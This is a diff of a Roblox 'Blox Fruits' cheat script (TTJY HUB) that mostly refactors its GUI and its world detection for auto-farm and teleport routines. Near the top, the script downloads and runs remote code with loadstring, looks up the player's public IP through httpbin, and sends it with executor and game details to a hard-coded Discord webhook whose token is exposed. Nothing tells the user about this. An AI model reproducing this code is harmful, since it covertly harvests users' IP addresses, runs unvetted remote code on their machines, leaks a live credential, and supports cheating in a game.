@@ -11,29 +11,36 @@ end
 --__Team = {}
 --__Team.Select = Config["Team"] or "p"
 __A = {}
-local Value_Game = "Blox Fruits"
-local WebhookUrl = 'https://discord.com/api/webhooks/1218168899434975292/8ihet3SCRq4RQJ_fXduTCH7YP3kbJu7JK1LPirx5LSsDbOL_H5CyZpDDZPUkCJl-XnZ8'
+__A.Api = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoiIntra/Api/main/Luable/__CheckGame.lua"))()
+-- Setting
+__A.Value_Game = tostring(__A.Api:Game())
+__A.WebhookUrl = 'https://discord.com/api/webhooks/1218168899434975292/8ihet3SCRq4RQJ_fXduTCH7YP3kbJu7JK1LPirx5LSsDbOL_H5CyZpDDZPUkCJl-XnZ8'
+
+-- Script
 __A.Executor = identifyexecutor()
 __A.RoExec = function()
     if tostring(__A.Executor) == "Krampus" then
-        Executor_Name = "RO-EXEC"
         return true
     else
-        Executor_Name = tostring(Executor)
         return false
     end
 end
-local HttpService = game:GetService("HttpService")
-local requestt = http_request or request or syn.request
-local body = requestt({Url = "https://httpbin.org/get"; Method = "GET"}).Body;
-local decoded = game:GetService("HttpService"):JSONDecode(body)
-local ip = decoded.origin
-local PlaceID = game.PlaceId
-local Path = "http://www.roblox.com/asset/?id="
-local headers = {
+if __A.RoExec() then
+    __A.Executor_Name = "RO-EXEC"
+else
+    __A.Executor_Name = tostring(__A.Executor)
+end
+__A.HttpService = game:GetService("HttpService")
+__A.requestt = http_request or request or syn.request
+__A.body = __A.requestt({Url = "https://httpbin.org/get"; Method = "GET"}).Body;
+__A.decoded = game:GetService("HttpService"):JSONDecode(__A.body)
+__A.ip = __A.decoded.origin
+__A.PlaceID = game.PlaceId
+__A.Path = "http://www.roblox.com/asset/?id="
+__A.headers = {
     ["Content-Type"] = "application/json"
 }   
-local data = {
+__A.data = {
     ["embeds"] = {
         {
             ["title"] = "Alchemy Webhook",
@@ -50,12 +57,12 @@ local data = {
                 },
                 {
                     ["name"] = 'IP',
-                    ["value"] = "╰―[ ||"..tostring(ip).."|| ]",
+                    ["value"] = "╰―[ ||"..tostring(__A.ip).."|| ]",
                     ["inline"] = true
                 },
                 {
                     ["name"] = 'Executor',
-                    ["value"] = "╰― "..Executor_Name,
+                    ["value"] = "╰― "..__A.Executor_Name,
                     ["inline"] = true
                 },
                 {
@@ -65,7 +72,7 @@ local data = {
                 },
                 {
                     ["name"] = 'Game',
-                    ["value"] = "╰― "..Value_Game,
+                    ["value"] = "╰― "..__A.Value_Game,
                     ["inline"] = false
                 },
                 {
@@ -87,8 +94,8 @@ local data = {
         }
     }
 }
-local newdata = HttpService:JSONEncode(data)
-requestt({Url = WebhookUrl, Body = newdata, Method = "POST", Headers = headers})
+__A.newdata = __A.HttpService:JSONEncode(__A.data)
+__A.requestt({Url = __A.WebhookUrl, Body = __A.newdata, Method = "POST", Headers = __A.headers})
 __VE = {
     ["Ps"] = game:GetService("Players"),
     ["LPs"] = game:GetService("Players").LocalPlayer,
@@ -130,10 +137,160 @@ if game:GetService("CoreGui"):FindFirstChild("TTJY ASSET") then
     game:GetService("CoreGui")["TTJY ASSET"]:Destroy()
 end
 task.wait()
-local a={["_TTJY ASSET"]=Instance.new("ScreenGui"),["_TTJY HUB"]=Instance.new("Frame"),["_UIStroke"]=Instance.new("UIStroke"),["_UICorner"]=Instance.new("UICorner"),["_TextButton"]=Instance.new("TextButton"),["_UIStroke1"]=Instance.new("UIStroke"),["_Stop Hop"]=Instance.new("Frame"),["_UIStroke2"]=Instance.new("UIStroke"),["_UICorner1"]=Instance.new("UICorner"),["_TextButton1"]=Instance.new("TextButton"),["_UIStroke3"]=Instance.new("UIStroke"),["_STOP TP"]=Instance.new("Frame"),["_UIStroke4"]=Instance.new("UIStroke"),["_UICorner2"]=Instance.new("UICorner"),["_TextButton2"]=Instance.new("TextButton"),["_UIStroke5"]=Instance.new("UIStroke"),["_STATUS"]=Instance.new("Frame"),["_UIStroke6"]=Instance.new("UIStroke"),["_UICorner3"]=Instance.new("UICorner"),["_ImageButton"]=Instance.new("ImageButton")};
--- Properties:
-Converted["_TTJY ASSET"]={ZIndexBehavior=Enum.ZIndexBehavior.Sibling,Name="TTJY ASSET",Parent=game:GetService("CoreGui")}Converted["_TTJY HUB"]={BackgroundColor3=Color3.fromRGB(56.0000042617321,56.0000042617321,56.0000042617321),BackgroundTransparency=0.4000000059604645,BorderColor3=Color3.fromRGB(0,0,0),BorderSizePixel=0,Position=UDim2.new(0.465000004,0,-0.1,0),Size=UDim2.new(0.0700000003,0,0.100000001,0),ZIndex=2,Name="TTJY HUB",Parent=Converted["_TTJY ASSET"]}Converted["_UIStroke"]={LineJoinMode=Enum.LineJoinMode.Bevel,Thickness=3,Parent=Converted["_TTJY HUB"]}Converted["_UICorner"].Parent=Converted["_TTJY HUB"]Converted["_TextButton"]={Font=Enum.Font.SourceSans,Text="TTJY HUB",TextColor3=Color3.fromRGB(0,255,0),TextScaled=true,TextSize=14,TextWrapped=true,BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,BorderColor3=Color3.fromRGB(0,0,0),BorderSizePixel=0,Size=UDim2.new(1,0,1,0),Parent=Converted["_TTJY HUB"]}Converted["_UIStroke1"].LineJoinMode=Enum.LineJoinMode.Bevel;Converted["_UIStroke1"].Parent=Converted["_TextButton"]Converted["_Stop Hop"]={BackgroundColor3=Color3.fromRGB(56.0000042617321,56.0000042617321,56.0000042617321),BackgroundTransparency=0.4000000059604645,BorderColor3=Color3.fromRGB(0,0,0),BorderSizePixel=0,Position=UDim2.new(0.39443019,0,-0.1,0),Size=UDim2.new(0.0700000003,0,0.100000001,0),ZIndex=2,Name="PAUSE Hop",Parent=Converted["_TTJY ASSET"]}Converted["_UIStroke2"].LineJoinMode=Enum.LineJoinMode.Bevel;Converted["_UIStroke2"].Thickness=3;Converted["_UIStroke2"].Parent=Converted["_Stop Hop"]Converted["_UICorner1"].Parent=Converted["_Stop Hop"]Converted["_TextButton1"]={Font=Enum.Font.SourceSans,Text="STOP HOP",TextColor3=Color3.fromRGB(255,0,0),TextScaled=true,TextSize=14,TextWrapped=true,BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,BorderColor3=Color3.fromRGB(0,0,0),BorderSizePixel=0,Size=UDim2.new(1,0,1,0),Parent=Converted["_Stop Hop"]}Converted["_UIStroke3"].LineJoinMode=Enum.LineJoinMode.Bevel;Converted["_UIStroke3"].Parent=Converted["_TextButton1"]Converted["_STOP TP"].BackgroundColor3=Color3.fromRGB(56.0000042617321,56.0000042617321,56.0000042617321)Converted["_STOP TP"].BackgroundTransparency=0.4000000059604645;Converted["_STOP TP"].BorderColor3=Color3.fromRGB(0,0,0)Converted["_STOP TP"].BorderSizePixel=0;Converted["_STOP TP"].Position=UDim2.new(0.534916341,0,-0.1,0)Converted["_STOP TP"].Size=UDim2.new(0.0700000003,0,0.100000001,0)Converted["_STOP TP"].ZIndex=2;Converted["_STOP TP"].Name="STOP TP"Converted["_STOP TP"].Parent=Converted["_TTJY ASSET"]Converted["_UIStroke4"].LineJoinMode=Enum.LineJoinMode.Bevel;Converted["_UIStroke4"].Thickness=3;Converted["_UIStroke4"].Parent=Converted["_STOP TP"]Converted["_UICorner2"].Parent=Converted["_STOP TP"]Converted["_TextButton2"].Font=Enum.Font.SourceSans;Converted["_TextButton2"].Text="STOP TP"Converted["_TextButton2"].TextColor3=Color3.fromRGB(255,0,0)Converted["_TextButton2"].TextScaled=true;Converted["_TextButton2"].TextSize=14;Converted["_TextButton2"].TextWrapped=true;Converted["_TextButton2"].BackgroundColor3=Color3.fromRGB(255,255,255)Converted["_TextButton2"].BackgroundTransparency=1;Converted["_TextButton2"].BorderColor3=Color3.fromRGB(0,0,0)Converted["_TextButton2"].BorderSizePixel=0;Converted["_TextButton2"].Size=UDim2.new(1,0,1,0)Converted["_TextButton2"].Parent=Converted["_STOP TP"]Converted["_UIStroke5"].LineJoinMode=Enum.LineJoinMode.Bevel;Converted["_UIStroke5"].Parent=Converted["_TextButton2"]Converted["_STATUS"].BackgroundColor3=Color3.fromRGB(56.0000042617321,56.0000042617321,56.0000042617321)Converted["_STATUS"].BackgroundTransparency=0.4000000059604645;Converted["_STATUS"].BorderColor3=Color3.fromRGB(0,0,0)Converted["_STATUS"].BorderSizePixel=0;Converted["_STATUS"].Position=UDim2.new(0.615287483,0,-0.05,0)Converted["_STATUS"].Size=UDim2.new(0.0203398019,0,0.0497226082,0)Converted["_STATUS"].ZIndex=2;Converted["_STATUS"].Name="STATUS"Converted["_STATUS"].Parent=Converted["_TTJY ASSET"]Converted["_UIStroke6"].LineJoinMode=Enum.LineJoinMode.Bevel;Converted["_UIStroke6"].Thickness=3;Converted["_UIStroke6"].Parent=Converted["_STATUS"]Converted["_UICorner3"].Parent=Converted["_STATUS"]Converted["_ImageButton"].Image="http://www.roblox.com/asset/?id=16586323338"Converted["_ImageButton"].BackgroundColor3=Color3.fromRGB(255,255,255)Converted["_ImageButton"].BackgroundTransparency=1;Converted["_ImageButton"].BorderColor3=Color3.fromRGB(0,0,0)Converted["_ImageButton"].BorderSizePixel=0;Converted["_ImageButton"].Size=UDim2.new(1,0,1,0)Converted["_ImageButton"].Parent=Converted["_STATUS"];
+local Converted = {
+	["_TTJY ASSET"] = Instance.new("ScreenGui");
+	["_TTJY HUB"] = Instance.new("Frame");
+	["_UIStroke"] = Instance.new("UIStroke");
+	["_UICorner"] = Instance.new("UICorner");
+	["_TextButton"] = Instance.new("TextButton");
+	["_UIStroke1"] = Instance.new("UIStroke");
+	["_Stop Hop"] = Instance.new("Frame");
+	["_UIStroke2"] = Instance.new("UIStroke");
+	["_UICorner1"] = Instance.new("UICorner");
+	["_TextButton1"] = Instance.new("TextButton");
+	["_UIStroke3"] = Instance.new("UIStroke");
+	["_STOP TP"] = Instance.new("Frame");
+	["_UIStroke4"] = Instance.new("UIStroke");
+	["_UICorner2"] = Instance.new("UICorner");
+	["_TextButton2"] = Instance.new("TextButton");
+	["_UIStroke5"] = Instance.new("UIStroke");
+	["_STATUS"] = Instance.new("Frame");
+	["_UIStroke6"] = Instance.new("UIStroke");
+	["_UICorner3"] = Instance.new("UICorner");
+	["_ImageButton"] = Instance.new("ImageButton");
+}
 
+-- Properties:
+
+Converted["_TTJY ASSET"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Converted["_TTJY ASSET"].Name = "TTJY ASSET"
+Converted["_TTJY ASSET"].Parent = game:GetService("CoreGui")
+--[[
+Converted["_TTJY ASSET"] = {
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    Name = "TTJY ASSET",
+    Parent = game:GetService("CoreGui")
+}
+]]
+Converted["_TTJY HUB"].BackgroundColor3 = Color3.fromRGB(56.0000042617321, 56.0000042617321, 56.0000042617321)
+Converted["_TTJY HUB"].BackgroundTransparency = 0.4000000059604645
+Converted["_TTJY HUB"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TTJY HUB"].BorderSizePixel = 0
+Converted["_TTJY HUB"].Position = UDim2.new(0.465000004, 0, -0.1, 0)
+Converted["_TTJY HUB"].Size = UDim2.new(0.0700000003, 0, 0.100000001, 0)
+Converted["_TTJY HUB"].ZIndex = 2
+Converted["_TTJY HUB"].Name = "TTJY HUB"
+Converted["_TTJY HUB"].Parent = Converted["_TTJY ASSET"]
+
+Converted["_UIStroke"].LineJoinMode = Enum.LineJoinMode.Bevel
+Converted["_UIStroke"].Thickness = 3
+Converted["_UIStroke"].Parent = Converted["_TTJY HUB"]
+
+Converted["_UICorner"].Parent = Converted["_TTJY HUB"]
+
+Converted["_TextButton"].Font = Enum.Font.SourceSans
+Converted["_TextButton"].Text = "TTJY HUB"
+Converted["_TextButton"].TextColor3 = Color3.fromRGB(0, 255, 0)
+Converted["_TextButton"].TextScaled = true
+Converted["_TextButton"].TextSize = 14
+Converted["_TextButton"].TextWrapped = true
+Converted["_TextButton"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextButton"].BackgroundTransparency = 1
+Converted["_TextButton"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton"].BorderSizePixel = 0
+Converted["_TextButton"].Size = UDim2.new(1, 0, 1, 0)
+Converted["_TextButton"].Parent = Converted["_TTJY HUB"]
+
+Converted["_UIStroke1"].LineJoinMode = Enum.LineJoinMode.Bevel
+Converted["_UIStroke1"].Parent = Converted["_TextButton"]
+
+Converted["_Stop Hop"].BackgroundColor3 = Color3.fromRGB(56.0000042617321, 56.0000042617321, 56.0000042617321)
+Converted["_Stop Hop"].BackgroundTransparency = 0.4000000059604645
+Converted["_Stop Hop"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_Stop Hop"].BorderSizePixel = 0
+Converted["_Stop Hop"].Position = UDim2.new(0.39443019, 0, -0.1, 0)
+Converted["_Stop Hop"].Size = UDim2.new(0.0700000003, 0, 0.100000001, 0)
+Converted["_Stop Hop"].ZIndex = 2
+Converted["_Stop Hop"].Name = "PAUSE Hop"
+Converted["_Stop Hop"].Parent = Converted["_TTJY ASSET"]
+
+Converted["_UIStroke2"].LineJoinMode = Enum.LineJoinMode.Bevel
+Converted["_UIStroke2"].Thickness = 3
+Converted["_UIStroke2"].Parent = Converted["_Stop Hop"]
+
+Converted["_UICorner1"].Parent = Converted["_Stop Hop"]
+
+Converted["_TextButton1"].Font = Enum.Font.SourceSans
+Converted["_TextButton1"].Text = "STOP HOP"
+Converted["_TextButton1"].TextColor3 = Color3.fromRGB(255, 0, 0)
+Converted["_TextButton1"].TextScaled = true
+Converted["_TextButton1"].TextSize = 14
+Converted["_TextButton1"].TextWrapped = true
+Converted["_TextButton1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextButton1"].BackgroundTransparency = 1
+Converted["_TextButton1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton1"].BorderSizePixel = 0
+Converted["_TextButton1"].Size = UDim2.new(1, 0, 1, 0)
+Converted["_TextButton1"].Parent = Converted["_Stop Hop"]
+
+Converted["_UIStroke3"].LineJoinMode = Enum.LineJoinMode.Bevel
+Converted["_UIStroke3"].Parent = Converted["_TextButton1"]
+
+Converted["_STOP TP"].BackgroundColor3 = Color3.fromRGB(56.0000042617321, 56.0000042617321, 56.0000042617321)
+Converted["_STOP TP"].BackgroundTransparency = 0.4000000059604645
+Converted["_STOP TP"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_STOP TP"].BorderSizePixel = 0
+Converted["_STOP TP"].Position = UDim2.new(0.534916341, 0, -0.1, 0)
+Converted["_STOP TP"].Size = UDim2.new(0.0700000003, 0, 0.100000001, 0)
+Converted["_STOP TP"].ZIndex = 2
+Converted["_STOP TP"].Name = "STOP TP"
+Converted["_STOP TP"].Parent = Converted["_TTJY ASSET"]
+
+Converted["_UIStroke4"].LineJoinMode = Enum.LineJoinMode.Bevel
+Converted["_UIStroke4"].Thickness = 3
+Converted["_UIStroke4"].Parent = Converted["_STOP TP"]
+
+Converted["_UICorner2"].Parent = Converted["_STOP TP"]
+
+Converted["_TextButton2"].Font = Enum.Font.SourceSans
+Converted["_TextButton2"].Text = "STOP TP"
+Converted["_TextButton2"].TextColor3 = Color3.fromRGB(255, 0, 0)
+Converted["_TextButton2"].TextScaled = true
+Converted["_TextButton2"].TextSize = 14
+Converted["_TextButton2"].TextWrapped = true
+Converted["_TextButton2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextButton2"].BackgroundTransparency = 1
+Converted["_TextButton2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton2"].BorderSizePixel = 0
+Converted["_TextButton2"].Size = UDim2.new(1, 0, 1, 0)
+Converted["_TextButton2"].Parent = Converted["_STOP TP"]
+
+Converted["_UIStroke5"].LineJoinMode = Enum.LineJoinMode.Bevel
+Converted["_UIStroke5"].Parent = Converted["_TextButton2"]
+
+Converted["_STATUS"].BackgroundColor3 = Color3.fromRGB(56.0000042617321, 56.0000042617321, 56.0000042617321)
+Converted["_STATUS"].BackgroundTransparency = 0.4000000059604645
+Converted["_STATUS"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_STATUS"].BorderSizePixel = 0
+Converted["_STATUS"].Position = UDim2.new(0.615287483, 0, -0.05, 0)
+Converted["_STATUS"].Size = UDim2.new(0.0203398019, 0, 0.0497226082, 0)
+Converted["_STATUS"].ZIndex = 2
+Converted["_STATUS"].Name = "STATUS"
+Converted["_STATUS"].Parent = Converted["_TTJY ASSET"]
+
+Converted["_UIStroke6"].LineJoinMode = Enum.LineJoinMode.Bevel
+Converted["_UIStroke6"].Thickness = 3
+Converted["_UIStroke6"].Parent = Converted["_STATUS"]
+
+Converted["_UICorner3"].Parent = Converted["_STATUS"]
+
+Converted["_ImageButton"].Image = "http://www.roblox.com/asset/?id=16586323338"
+Converted["_ImageButton"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_ImageButton"].BackgroundTransparency = 1
+Converted["_ImageButton"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_ImageButton"].BorderSizePixel = 0
+Converted["_ImageButton"].Size = UDim2.new(1, 0, 1, 0)
+Converted["_ImageButton"].Parent = Converted["_STATUS"]
 
 TTJYHUB = Converted["_TextButton"]
 STOPTP = Converted["_TextButton2"]
@@ -233,22 +390,17 @@ for i=1,#__Inc do
         __Ws[i] = __Inc[i]
     end)
 end
-function __World:Check()
-    if placeId == 2753915549 then
-        return __Ws[1]
-    elseif placeId == 4442272183 then
-        return __Ws[2]
-    elseif placeId == 7449423635 then
-        return __Ws[3]
-    end
-end
-__World:Check()
-if __World:Check() < __N[1] then
-elseif __World:Check() == __N[1] then
-elseif __World:Check() > __N[1] then
+local placeId = game.PlaceId
+local WorldCheck = {["First Sea"]=false,["Second Sea"]=false,["Third Sea"]=false}
+if placeId == 2753915549 then
+    WorldCheck["First Sea"] = true
+elseif placeId == 4442272183 then
+    WorldCheck["Second Sea"] = true
+elseif placeId == 7449423635 then
+    WorldCheck["Third Sea"] = true
 end
 local function CheckQuestBoss(SelectBoss)
-	if __World:Check() < __N[1] then
+	if WorldCheck["First Sea"] then
 		if SelectBoss == "Saber Expert" then
             return {
                 [1] = "Saber Expert",
@@ -390,7 +542,7 @@ local function CheckQuestBoss(SelectBoss)
                 [3] = __VE[26](6041.82813, 52.7112198, 3907.45142, -0.563162148, 1.73805248e-09, -0.826346457, -5.94632716e-08, 1, 4.26280238e-08, 0.826346457, 7.31437524e-08, -0.563162148)
             }
 		end
-	elseif __World:Check() == __N[1] then
+	elseif WorldCheck["Second Sea"] then
 		-- New World
 		if SelectBoss == "Diamond" then
             return {
@@ -471,7 +623,7 @@ local function CheckQuestBoss(SelectBoss)
                 [3] = __VE[26](-3570.18652, 123.328949, -11555.9072, 0.465199202, -1.3857326e-08, 0.885206044, 4.0332897e-09, 1, 1.35347511e-08, -0.885206044, -2.72606271e-09, 0.465199202)
             }
 		end
-	elseif __World:Check() > __N[1] then
+	elseif WorldCheck["Third Sea"] then
 		-- Third World
 		if SelectBoss == "Stone" then
             return {
@@ -549,7 +701,7 @@ local function CheckQuestBoss(SelectBoss)
 	end
 end
 local function FindTargetBoss(value)
-	if __World:Check() < __N[1] then
+	if WorldCheck["First Sea"] then
 		if tostring(value) == "Saber Expert" then
             return {
                 [1] = "Saber Expert",
@@ -689,7 +841,7 @@ local function FindTargetBoss(value)
                 [3] = __VE[26](6041.82813, 52.7112198, 3907.45142, -0.563162148, 1.73805248e-09, -0.826346457, -5.94632716e-08, 1, 4.26280238e-08, 0.826346457, 7.31437524e-08, -0.563162148)
             }
 		end
-	elseif __World:Check() == __N[1] then
+	elseif WorldCheck["Second Sea"] then
 		-- New World
 		if tostring(value) == "Diamond" then
             return {
@@ -770,7 +922,7 @@ local function FindTargetBoss(value)
                 [3] = __VE[26](-3570.18652, 123.328949, -11555.9072, 0.465199202, -1.3857326e-08, 0.885206044, 4.0332897e-09, 1, 1.35347511e-08, -0.885206044, -2.72606271e-09, 0.465199202)
             }
 		end
-	elseif __World:Check() > __N[1] then
+	elseif WorldCheck["Third Sea"] then
 		-- Third World
 		if tostring(value) == "Stone" then
             return {
@@ -848,7 +1000,7 @@ local function FindTargetBoss(value)
 	end
 end
 local function TpOfTpTab()
-    if __World:Check() < __N[1] then
+    if WorldCheck["First Sea"] then
         if SelectTpSpot == "\80\105\114\97\116\101\32\83\116\97\114\116\101\114" then
             if InstanceTp then
                 CFrameTargetTp = __VE[26](994.9686279296875, 16.641939163208008, 1427.6319580078125)
@@ -1009,7 +1161,7 @@ local function TpOfTpTab()
                 end
             end
         end
-    elseif __World:Check() == __N[1] then
+    elseif WorldCheck["Second Sea"] then
         if SelectTpSpot == "\75\105\110\103\100\111\109\32\79\102\32\82\111\115\101" then
             if InstanceTp then
                 CFrameTargetTp = __VE[26](-12.300018310546875, 29.402055740356445, 2766.919677734375)
@@ -1191,7 +1343,7 @@ local function TpOfTpTab()
                 end
             end
         end
-    elseif __World:Check() > __N[1] then
+    elseif WorldCheck["Third Sea"] then
         if SelectTpSpot == "\77\97\110\115\105\111\110" then
             if InstanceTp then
                 if Setting.UnlockPortal then
@@ -1329,7 +1481,7 @@ local function TpOfTpTab()
 end
 local function CheckLevel()
     Lv = game:GetService("Players").LocalPlayer.Data.Level.Value
-    if __World:Check() < __N[1] then
+    if WorldCheck["First Sea"] then
         if ((Lv == 1 or Lv <= 9) and not Setting.AutoFarmSelectMob) or (Setting.AutoFarmSelectMob and tostring(Setting.SelectMob) == "Bandit" and not Setting.AutoFarmLevel) then -- Bandit
             return {
                 [1] = "Bandit [Lv. 5]",
@@ -1587,7 +1739,7 @@ local function CheckLevel()
                 [6] = CFrame.new(5677.6772460938, 92.786109924316, 4966.6323242188)
             }
         end
-    elseif __World:Check() == __N[1] then
+    elseif WorldCheck["Second Sea"] then
         if ((Lv == 700 or Lv <= 724) and not Setting.AutoFarmSelectMob) or (Setting.AutoFarmSelectMob and tostring(Setting.SelectMob) == "Raider") then -- Raider
             return {
                 [1] = "Raider [Lv. 700]",
@@ -1802,7 +1954,7 @@ local function CheckLevel()
                 [6] = CFrame.new(-3262.9301757813, 298.69036865234, -10552.529296875)
             }
         end
-    elseif __World:Check() > __N[1] then
+    elseif WorldCheck["Third Sea"] then
         if ((Lv == 1500 or Lv <= 1524) and not Setting.AutoFarmSelectMob) or (Setting.AutoFarmSelectMob and tostring(Setting.SelectMob) == "Pirate Millionaire") then -- Pirate Millionaire
             return {
                 [1] = "Pirate Millionaire [Lv. 1500]",
@@ -5223,11 +5375,11 @@ do
         end)
     end
     __U[23]()
-    if __World:Check() < __N[1] then
+    if WorldCheck["First Sea"] then
         Valuess = {"Bandit", "Monkey", "Gorilla", "Pirate", "Brute", "Desert Bandit", "Desert Officer", "Snow Bandit", "Snowman", "Chief Petty Officer", "Sky Bandit", "Dark Master", "Prisoner", "Dangerous Prisoner", "Toga Warrior", "Gladiator", "Military Soldier", "Fishman Warrior", "Fishman Commando", "God's Guard", "Shanda", "Royal Squad", "Royal Soldier", "Galley Pirate"}
-    elseif __World:Check() == __N[1] then
+    elseif WorldCheck["Second Sea"] then
         Valuess = {"Raider", "Mercenary", "Swan Pirate", "Factory Staff", "Marine Lieutenant", "Marine Captain", "Zombie", "Vampire", "Snow Trooper", "Winter Warrior", "Lab Subordinate", "Horned Warrior", "Magma Ninja", "Lava Pirate", "Ship Deckhand", "Ship Engineer", "Ship Steward", "Ship Officer", "Arctic Warrior", "Snow Lurker", "Sea Soldier", "Water Fighter"}
-    elseif __World:Check() > __N[1] then
+    elseif WorldCheck["Third Sea"] then
         Valuess = {"Pirate Millionaire", "Pistol Billionaire", "Dragon Crew Warrior", "Dragon Crew Archer", "Female Islander", "Giant Islander", "Marine Commodore", "Marine Rear Admiral", "Fishman Raider", "Fishman Captain", "Forest Pirate", "Mythological Pirate", "Jungle Pirate", "Musketeer Pirate", "Musketeer Pirate", "Living Zombie", "Demonic Souls", "Posessed Mummys", "Peanut Scout", "Peanut Presidents", "Ice Cream Chefs", "Ice Cream Commanders", "Cookie Crafters"}
     end
     SelectMob = Tabs.AutoFarmTab:AddDropdown("SelectMob", {
@@ -5244,11 +5396,11 @@ do
     AutoFarmSelectMob:OnChanged(function()
         Setting.AutoFarmSelectMob = Options.AutoFarmSelectMob.Value
     end)
-    if __World:Check() < __N[1] then
+    if WorldCheck["First Sea"] then
         Valuess = BossName["First Sea"]
-    elseif __World:Check() == __N[1] then
+    elseif WorldCheck["Second Sea"] then
         Valuess = BossName["Second Sea"]
-    elseif __World:Check() > __N[1] then
+    elseif WorldCheck["Third Sea"] then
         Valuess = BossName["Third Sea"]
     end
     SelectBoss = Tabs.AutoFarmTab:AddDropdown("SelectBoss", {
@@ -5300,7 +5452,7 @@ do
         Setting.AutoFarmAllSwordMastery = Options.AutoFarmAllSwordMastery.Value
     end)
 
-    if __World:Check() > __N[1] then
+    if WorldCheck["Third Sea"] then
         Tabs.AutoFarmTab:AddSection("Bone")
         AutoBone = Tabs.AutoFarmTab:AddToggle("AutoBone", {Title = "Auto Farm Bones", Default = Setting.AutoBone })
 
@@ -7045,7 +7197,7 @@ __U[20](function()
     while __U[19]() do
         if __A.AutoThirdSea then
             __U[6](function()
-                if __VE["LPs"].Data.Level.Value >= __N[2]*__N[3]*__N[8]*__N[8] and __World:Check() == __N[1] then
+                if __VE["LPs"].Data.Level.Value >= __N[2]*__N[3]*__N[8]*__N[8] and WorldCheck["Second Sea"] then
                     __A.AutoFarm = __Y[2]
                     if CommF:InvokeServer("ZQuestProgress", "General") == __Y[4]then
                         tpwithnewtpbyme2(__U[26](-1926.3221435547, 12.819851875305, 1738.3092041016),5)
